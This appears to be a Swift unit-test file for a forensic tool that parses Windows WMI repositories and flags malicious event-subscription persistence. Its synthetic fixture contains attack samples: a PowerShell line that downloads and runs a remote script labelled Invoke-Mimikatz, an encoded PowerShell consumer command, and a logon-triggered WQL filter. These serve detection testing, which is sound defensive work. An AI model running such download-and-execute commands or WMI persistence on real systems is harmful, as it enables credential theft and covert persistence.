//
//  WmiParserTests.swift
//  StrataTests
//
//  Validates WmiRepositoryParser's OBJECTS.DATA carve. The byte layout here was
//  confirmed against a real WMI repository (flare-wmi's `wmikatz` sample) — the
//  parser extracts the same bindings / WQL / command / Invoke-Mimikatz script
//  from that 15 MB file; this fixture reproduces the exact on-disk shapes
//  (ASCII binding refs, `<name>\0\0<query>` filters, `marker\0<command>`
//  consumers, and an ActiveScript ScriptText payload) in a self-contained blob.
//

import Testing
import Foundation
@testable import Strata

struct WmiParserTests {
    /// Build a synthetic OBJECTS.DATA fragment matching the validated real layout.
    private func sample() -> [UInt8] {
        var b: [UInt8] = []
        func ascii(_ s: String) { b += Array(s.utf8) }
        func nul(_ n: Int = 1) { b += [UInt8](repeating: 0, count: n) }

        // --- a malicious CommandLine consumer instance: marker \0 <command> \0 .. name ---
        ascii("CommandLineEventConsumer"); nul(2)
        ascii(#"powershell.exe -enc ZQBjAGgAbwA="#); nul(1)
        ascii("noise"); nul(1)
        ascii("EvilConsumer"); nul(2)

        // --- a filter with its WQL: <name>\0\0<query>\0 ---
        ascii("EvilFilter"); nul(2)
        ascii(#"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_LogonSession""#); nul(2)

        // --- the binding that ties them together (ASCII refs) ---
        ascii("__FilterToConsumerBinding"); nul(1)
        ascii(#"CommandLineEventConsumer.Name="EvilConsumer""#); nul(1)
        ascii(#"__EventFilter.Name="EvilFilter""#); nul(2)

        // --- a benign built-in binding ---
        ascii("__FilterToConsumerBinding"); nul(1)
        ascii(#"CommandLineEventConsumer.Name="BVTConsumer""#); nul(1)
        ascii(#"__EventFilter.Name="BVTFilter""#); nul(2)

        // --- an ActiveScript payload (unbound) with a script indicator ---
        nul(4)
        ascii("function Invoke-Mimikatz { IEX (New-Object Net.WebClient).DownloadString('http://x/m.ps1') }")
        ascii(" # reflectively loads mimikatz in memory ".padding(toLength: 140, withPad: " ", startingAt: 0))
        nul(2)
        return b
    }

    @Test func carvesBindingsWithQueryAndCommand() throws {
        let entries = WmiRepositoryParser.parse(bytes: sample(), sourceFile: "/x/OBJECTS.DATA")
        let bindings = entries.filter { $0.kind == .binding }
        #expect(bindings.count == 2)

        let evil = try #require(bindings.first { $0.consumerName == "EvilConsumer" })
        #expect(evil.consumerType == "CommandLineEventConsumer")
        #expect(evil.filterName == "EvilFilter")
        #expect(evil.command == #"powershell.exe -enc ZQBjAGgAbwA="#)
        #expect(evil.query?.contains("__InstanceModificationEvent") == true)
        #expect(!evil.isCommonBenign)

        let bvt = try #require(bindings.first { $0.consumerName == "BVTConsumer" })
        #expect(bvt.isCommonBenign)              // built-in / PoC name, de-emphasised
    }

    @Test func carvesSuspiciousScriptConsumer() throws {
        let scripts = WmiRepositoryParser.parse(bytes: sample(), sourceFile: "/x/OBJECTS.DATA")
            .filter { $0.kind == .scriptConsumer }
        let s = try #require(scripts.first)
        #expect(s.scriptEngine == "PowerShell")
        #expect(s.scriptText?.contains("Invoke-Mimikatz") == true)
    }

    @Test func ignoresNonRepositoryBytes() {
        // No markers, no script indicators -> nothing carved, no crash.
        let junk = [UInt8](repeating: 0x41, count: 5000)
        #expect(WmiRepositoryParser.parse(bytes: junk, sourceFile: "/x/OBJECTS.DATA").isEmpty)
        #expect(WmiRepositoryParser.parse(bytes: [], sourceFile: "/x/OBJECTS.DATA").isEmpty)
    }
}

struct WmiAnalyzerTests {
    private func binding(_ consumer: String, type: String, filter: String,
                         command: String? = nil, benign: Bool = false) -> WmiPersistenceEntry {
        WmiPersistenceEntry(kind: .binding, consumerName: consumer, consumerType: type,
                            filterName: filter, query: "SELECT * FROM __InstanceCreationEvent",
                            command: command, isCommonBenign: benign, sourceFile: "/x/OBJECTS.DATA")
    }
    private func context(_ wmi: [WmiPersistenceEntry]) -> AnalysisContext {
        AnalysisContext(files: [], events: [], timeline: [], registryValues: [], wmi: wmi)
    }

    @Test func flagsEncodedPowerShellBindingHigh() throws {
        let findings = WmiAnalyzer().analyze(context: context([
            binding("Updater", type: "CommandLineEventConsumer", filter: "BootFilter",
                    command: "powershell.exe -enc ZQBjAA=="),
        ]))
        let f = try #require(findings.first { $0.title.contains("WMI persistence") })
        #expect(f.severity == .high)
        #expect(f.technique?.attackID == "T1546.003")
        #expect(f.phase == .installation)
    }

    @Test func flagsScriptConsumerBindingHigh() throws {
        let findings = WmiAnalyzer().analyze(context: context([
            binding("Sub", type: "ActiveScriptEventConsumer", filter: "LogonFilter"),
        ]))
        #expect(findings.first?.severity == .high)   // a script consumer in a subscription
    }

    @Test func plainBindingIsLow() throws {
        let findings = WmiAnalyzer().analyze(context: context([
            binding("Backup", type: "CommandLineEventConsumer", filter: "TimerFilter",
                    command: #"C:\Program Files\Tool\run.exe"#),
        ]))
        // Surfaced for review (legit management software uses subscriptions too)
        // but low — no attacker tell.
        #expect(findings.first?.severity == .low)
    }

    @Test func skipsBuiltinBenignBindings() {
        let findings = WmiAnalyzer().analyze(context: context([
            binding("BVTConsumer", type: "CommandLineEventConsumer", filter: "BVTFilter",
                    command: "cscript KernCap.vbs", benign: true),
        ]))
        #expect(findings.isEmpty)
    }

    @Test func flagsCarvedScriptPayload() throws {
        let e = WmiPersistenceEntry(kind: .scriptConsumer, consumerType: "ActiveScriptEventConsumer",
                                    scriptEngine: "PowerShell",
                                    scriptText: "function Invoke-Mimikatz { ... }", sourceFile: "/x/OBJECTS.DATA")
        let f = try #require(WmiAnalyzer().analyze(context: context([e])).first)
        #expect(f.severity == .high)
        #expect(f.title.contains("script consumer"))
    }

    @Test func emptyYieldsNothing() {
        #expect(WmiAnalyzer().analyze(context: context([])).isEmpty)
    }
}
